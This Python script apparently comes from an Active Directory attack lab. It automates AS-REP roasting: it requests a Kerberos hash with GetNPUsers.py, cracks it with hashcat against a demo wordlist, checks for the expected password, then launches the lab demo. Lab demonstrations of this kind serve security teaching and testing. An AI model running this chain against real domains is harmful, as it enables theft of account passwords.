#!/usr/bin/env python3
"""scripts/run-full-demo.py."""


from rrlib import ROOT, attacker_cmd, container_path, ensure_repo_writable_dir, load_config, run, utc_stamp


def main():
    config = load_config()
    evidence_root = ROOT / config["demo"]["evidence_root"]
    ensure_repo_writable_dir(evidence_root)
    evidence_dir = evidence_root / f"asrep-{utc_stamp()}"
    evidence_dir.mkdir(parents=True, exist_ok=True)

    asrep_output = evidence_dir / "asrep.txt"
    hash_file = evidence_dir / "asrep.hash"
    cracked_file = evidence_dir / "cracked.txt"
    potfile = evidence_dir / "hashcat.pot"

    print(f"Requesting AS-REP hash for {config['active_directory']['asrep_username']}")
    request = run(
        [
            *attacker_cmd("GetNPUsers.py"),
            f"{config['active_directory']['domain_name']}/{config['active_directory']['asrep_username']}",
            "-no-pass",
            "-dc-ip",
            config["windows"]["ip"],
            "-request",
        ],
        check=False,
        capture=True,
    )
    asrep_output.write_text(request.stdout + request.stderr, encoding="utf-8")
    if request.returncode != 0:
        return request.returncode

    hash_lines = [
        line
        for line in asrep_output.read_text(encoding="utf-8").splitlines()
        if "$krb5asrep$" in line
    ]
    hash_file.write_text("\n".join(hash_lines) + "\n", encoding="utf-8")
    if not hash_lines:
        print("No AS-REP hash was found in GetNPUsers output.")
        return 1

    print("Cracking hash with demo wordlist")
    run(
        [
            *attacker_cmd("hashcat"),
            "-m",
            "18200",
            container_path(hash_file),
            "/opt/reuserupture/wordlists/demo-wordlist.txt",
            "--potfile-path",
            container_path(potfile),
            "--force",
        ],
        check=False,
    )
    cracked = run(
        [
            *attacker_cmd("hashcat"),
            "-m",
            "18200",
            container_path(hash_file),
            "--potfile-path",
            container_path(potfile),
            "--show",
        ],
        check=False,
        capture=True,
    )
    cracked_file.write_text(cracked.stdout + cracked.stderr, encoding="utf-8")

    if config["active_directory"]["asrep_password"] not in cracked_file.read_text(encoding="utf-8"):
        print("Did not recover expected password.")
        return 1

    print("Recovered password; running normal demo.")
    return run([str(ROOT / "demo.py"), "--yes"], check=False).returncode


if __name__ == "__main__":
    raise SystemExit(main())
